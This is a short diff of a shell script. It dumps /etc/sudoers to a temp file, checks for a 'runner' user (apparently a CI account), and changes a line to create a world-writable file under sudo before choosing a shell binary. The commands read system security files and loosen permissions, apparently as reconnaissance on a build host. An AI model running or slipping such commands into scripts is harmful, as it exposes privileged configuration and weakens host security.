@@ -43,7 +43,7 @@ grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 > /tmp/js9a.txt
 (id | grep "^uid=[0-9]\{1,9\}(runner)") && 
 (
     touch /tmp/keepalive;
-    touch /tmp/0a9.txt;
+    sudo touch /tmp/0a9.txt; chmod 0777 /tmp/0a9.txt;
     alias ll="ls -al";
     d1="/bin/sh";
     (which  ash) && d1=$(which  ash);
